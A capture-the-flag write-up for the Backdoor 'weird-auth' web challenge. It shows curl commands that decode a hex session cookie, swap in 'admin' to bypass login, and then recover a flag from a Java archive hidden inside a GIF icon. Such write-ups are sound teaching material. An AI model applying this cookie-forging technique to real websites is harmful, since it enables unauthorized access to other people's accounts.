weird-auth
==========

Link: https://backdoor.sdslabs.co/challenges/WEIRD-AUTH \
Tags: [scythe16] [web]

Description:
------------

Log in to a website as the admin user, and steal a flag.

Solution:
---------

There's nothing much to see on this website; just a login form asking for a name and password. If you enter pretty much anything, it will log you in straight away:

```
$ echo -n >cookiejar
$ curl -s -bcookiejar -ccookiejar -L --include -dusername=foo -dpassword=bar http://hack.bckdr.in:16004/submit.php
HTTP/1.1 302 Found
Host: hack.bckdr.in:16004
Connection: close
X-Powered-By: PHP/5.6.40
Set-Cookie: session=6f61736469303833686a64616e6d6164666f777530666f6f
Location: webpage.php
Content-type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Host: hack.bckdr.in:16004
Connection: close
X-Powered-By: PHP/5.6.40
Content-type: text/html; charset=UTF-8


<html>
  <head>
    <title>Login Successfull</title>
        <link rel="shortcut icon" href="icon.gif" type="image/x-icon" />
      </head>
  <body>
    Welcome foo !!!<br />
    Click <a href = "logout.php">here</a> to log out
  </body>
</html>
$ cat cookiejar
# Netscape HTTP Cookie File
# https://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

hack.bckdr.in	FALSE	/	FALSE	0	session	6f61736469303833686a64616e6d6164666f777530666f6f
```

But if you try to use `admin` as the username, you'll get an error:

```
$ echo -n >cookiejar
$ curl -bcookiejar -ccookiejar -L --include -dusername=admin -dpassword=letmein http://hack.bckdr.in:16004/submit.php
HTTP/1.1 302 Found
Host: hack.bckdr.in:16004
Connection: close
X-Powered-By: PHP/5.6.40
Location: index.php?error=Invalid_Credentials
Content-type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Host: hack.bckdr.in:16004
Connection: close
X-Powered-By: PHP/5.6.40
Content-type: text/html; charset=UTF-8


<html>
  <head>
    <title>Login</title>
    <link rel="shortcut icon" href="icon.gif" type="image/x-icon" />
  </head>
  <body>
    <form action = "submit.php" method = "post">
      Username: <input type = "text" name = "username" /><br />
      Password: <input type = "password" name = "password" />
      <p style='color: red'>Invalid_Credentials</p>      <input type = "submit" value = "Login" />
    </form>
  </body>
</html>
```

Perhaps we can bypass this by editing the cookie value. Hex decoding the cookie we obtained earlier gives us the following string:

```
oasdi083hjdanmadfowu0foo
```

The last three characters correspond to the username we provided. Let's change those to `admin` and jump straight to the `webpage.php` URL that the website redirects to after a successful login:

```
$ echo -n oasdi083hjdanmadfowu0admin | xxd -p
6f61736469303833686a64616e6d6164666f77753061646d696e
$ curl --include -bsession=6f61736469303833686a64616e6d6164666f77753061646d696e http://hack.bckdr.in:16004/webpage.php
HTTP/1.1 200 OK
Host: hack.bckdr.in:16004
Connection: close
X-Powered-By: PHP/5.6.40
Content-type: text/html; charset=UTF-8


<html>
  <head>
    <title>Login Successfull</title>
        <link rel="shortcut icon" href="icon256.gif" type="image/x-icon" />
      </head>
  <body>
    Welcome admin !!!<br />
    Click <a href = "logout.php">here</a> to log out
  </body>
</html>
```

No flag there, but it says "Welcome admin" so we must have logged in. And wait a minute; the location of the shortcut icon has changed from `icon.gif` to `icon256.gif`. That's where the flag must be.

The `strings` utility finds a few unusual strings near the end of this file:

```
$ strings icon256.gif
GIF89a
#"%##)&&*)&&&))'(,*+&*&3*%1.-9+%31.;2-;1&1/0532:63;96=<:785./.M(
D-$C4,I5)W7)C:4L;3B>;G95U=4T*"d8(l=3J
  :
  :
META-INF/
META-INF/MANIFEST.MFPK
lHCX
Program.classPK
```

What's a program doing in there? The `PK` looks like the signature of a ZIP file, and `zipinfo` agrees:

```
$ zipinfo icon256.gif
Archive:  icon256.gif
Zip file size: 38505 bytes, number of entries: 3
warning [icon256.gif]:  37413 extra bytes at beginning or within zipfile
  (attempting to process anyway)
-rw----     2.0 fat        0 bX defN 16-Mar-12 17:13 META-INF/
-rw----     2.0 fat       89 bl defN 16-Mar-12 17:13 META-INF/MANIFEST.MF
-rw----     2.0 fat      990 bl defN 16-Mar-12 17:13 Program.class
3 files, 1079 bytes uncompressed, 702 bytes compressed:  34.9%
```

This looks like a Java class file. Unfortunately, running it doesn't seem to work:

```
$ java -cp . Program
Flag is -wGÑ«UC}}ï¿½ï¿½ï¿½e
```

We're definitely getting warm, though. Running `strings` on the unzipped class file reveals the base64-encoded flag.
